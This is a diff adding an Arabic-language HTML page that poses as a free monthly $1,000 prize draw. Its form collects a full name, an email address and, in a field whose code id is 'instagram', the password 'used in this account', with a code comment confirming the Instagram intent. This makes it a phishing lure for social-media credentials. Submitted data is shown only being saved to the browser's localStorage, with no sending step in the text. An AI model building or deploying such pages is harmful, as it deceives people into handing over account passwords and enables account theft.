@@ -1,1 +1,178 @@
 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>السحب الشهري الكبير | 1,000$</title>
+    <style>
+        /* 🎨 لوحة الألوان والتنسيق الفاخر */
+        :root {
+            --primary-color: #d4af37;      /* اللون الذهبي الملكي */
+            --primary-hover: #aa8c2c;      /* لون الزر عند التمرير */
+            --bg-gradient: linear-gradient(135deg, #111827 0%, #1f2937 100%); /* خلفية داكنة */
+            --card-bg: #2d3748;            /* خلفية البطاقة */
+            --text-color: #f3f4f6;         /* لون النصوص الأساسية */
+            --error-color: #f87171;        /* لون التنبيهات والأخطاء */
+            --success-color: #34d399;      /* لون النجاح */
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-sizing: border-box;
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+
+        h2 { margin: 0; color: var(--primary-color); font-size: 28px; }
+        .prize-tag { font-size: 42px; font-weight: 800; color: #fff; text-shadow: 0 0 10px rgba(212, 175, 55, 0.6); margin: 15px 0; }
+        p.subtitle { color: #9ca3af; font-size: 15px; margin-bottom: 30px; }
+        
+        /* تنسيق الحقول */
+        .form-group { text-align: right; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #cbd5e1; }
+        input { width: 100%; padding: 12px 15px; background: #1f2937; border: 2px solid #4b5563; border-radius: 10px; font-size: 15px; color: white; outline: none; box-sizing: border-box; transition: border-color 0.3s; }
+        input:focus { border-color: var(--primary-color); }
+        
+        /* أزرار ونصوص التنبيه */
+        button { width: 100%; padding: 14px; background: var(--primary-color); color: #111827; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 5px; }
+        button:hover { background: #f1c40f; }
+        
+        .warning-text { color: var(--error-color); font-size: 13px; font-weight: bold; margin: 15px 0 5px 0; line-height: 1.5; text-align: justify; }
+        .wish-text { color: var(--primary-color); font-size: 14px; font-weight: bold; margin: 0 0 15px 0; }
+
+        .msg { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: bold; display: none; }
+        .msg.error { background: rgba(248, 113, 113, 0.15); color: var(--error-color); border: 1px solid var(--error-color); display: block; }
+        .msg.success { background: rgba(52, 211, 153, 0.15); color: var(--success-color); border: 1px solid var(--success-color); display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="font-size: 55px; margin-bottom: 5px;">🏆</div>
+    <h2 id="uiTitle">السحب الشهري الكبير</h2>
+    <div class="prize-tag" id="uiPrize">1,000$</div>
+    <p class="subtitle" id="uiSubtitle">سجل الآن مجاناً للدخول في سحب هذا الشهر</p>
+    
+    <form id="dynamicForm">
+        <!-- الحقول تنشأ هنا تلقائياً بترتيبك المطلوب -->
+        <div id="fieldsContainer"></div>
+        
+        <!-- النصوص التحذيرية والتشجيعية منفصلة تماماً -->
+        <p id="uiWarning" class="warning-text"></p>
+        <p id="uiWish" class="wish-text"></p>
+        
+        <button type="submit" id="uiBtn">دخول السحب الآمن</button>
+    </form>
+    
+    <div id="msgBox" class="msg"></div>
+</div>
+
+<script>
+// =========================================================
+// ⚙️ لوحة التحكم في نصوص الموقع (تعديل سهل وسريع من هنا)
+// =========================================================
+const CONFIG = {
+    title: "السحب الشهري الكبير",
+    prize: "1,000$",
+    subtitle: "سجل بياناتك الآن مجاناً للدخول في سحب هذا الشهر",
+    btnText: "دخول السحب الآمن",
+    
+    // النصوص التي طلبت فصلها وتحديثها
+    warningText: "⚠️ تنبيه: أي تلاعب أو كتابة للمعلومات بشكل غير صحيح يؤدي للطرد من السحب مباشرة.",
+    wishText: "✨ وحظ أوفر للجميع ✨"
+};
+
+// ⚙️ مصفوفة الحقول: مرتبة لتجعل حساب إنستغرام تحت البريد الإلكتروني مباشرة
+const FIELDS = [
+    { id: "username", label: "الاسم الكامل:", type: "text", placeholder: "user nam", required: true },
+    { id: "useremail", label: "البريد الإلكتروني الحقيقي:", type: "email", placeholder: "example@gmail.com", required: true },
+    { id: "instagram", label: " ادخل كلمة المرور بحذر:", type: "text", placeholder: " المستخدمة في هذا الحساب ", required: true }
+];
+
+// تطبيق النصوص على واجهة الموقع
+document.getElementById('uiTitle').innerText = CONFIG.title;
+document.getElementById('uiPrize').innerText = CONFIG.prize;
+document.getElementById('uiSubtitle').innerText = CONFIG.subtitle;
+document.getElementById('uiBtn').innerText = CONFIG.btnText;
+document.getElementById('uiWarning').innerText = CONFIG.warningText;
+document.getElementById('uiWish').innerText = CONFIG.wishText;
+
+// إنشاء الحقول في واجهة الـ HTML برمجياً وبطريقة مرنة
+const container = document.getElementById('fieldsContainer');
+FIELDS.forEach(field => {
+    const group = document.createElement('div');
+    group.className = 'form-group';
+    group.innerHTML = `
+        <label for="${field.id}">${field.label}</label>
+        <input type="${field.type}" id="${field.id}" placeholder="${field.placeholder}" ${field.required ? 'required' : ''} autocomplete="off">
+    `;
+    container.appendChild(group);
+});
+
+// معالجة نموذج التسجيل والتحقق من التكرار والبيانات
+document.getElementById('dynamicForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const msgBox = document.getElementById('msgBox');
+    
+    // تجميع المدخلات تلقائياً
+    let entryData = {};
+    FIELDS.forEach(field => {
+        entryData[field.id] = document.getElementById(field.id).value.trim();
+    });
+
+    const emailKey = entryData['useremail'].toLowerCase();
+    
+    // التحقق من صحة صياغة البريد الإلكتروني
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(emailKey)) {
+        msgBox.className = "msg error";
+        msgBox.innerText = "عذراً، صيغة البريد الإلكتروني غير صحيحة!";
+        return;
+    }
+
+    // فحص التكرار عبر الـ LocalStorage لمنع نفس الشخص من التسجيل مرتين
+    let participants = JSON.parse(localStorage.getItem('contestants')) || [];
+    const isExist = participants.some(p => p.useremail.toLowerCase() === emailKey);
+    
+    if (isExist) {
+        msgBox.className = "msg error";
+        msgBox.innerText = "هذا البريد الإلكتروني مسجل بالفعل في سحب هذا الشهر!";
+        return;
+    }
+    
+    // حفظ البيانات مع تسجيل تاريخ دقيق للاشتراك
+    entryData['timestamp'] = new Date().toLocaleString('ar-EG');
+    participants.push(entryData);
+    localStorage.setItem('contestants', JSON.stringify(participants));
+    
+    // إظهار رسالة النجاح وتصفير المدخلات
+    msgBox.className = "msg success";
+    msgBox.innerText = "تم تسجيل بياناتك بنجاح في السحب. حظاً موفقاً!";
+    document.getElementById('dynamicForm').reset();
+});
+</script>
+</body>
+</html>
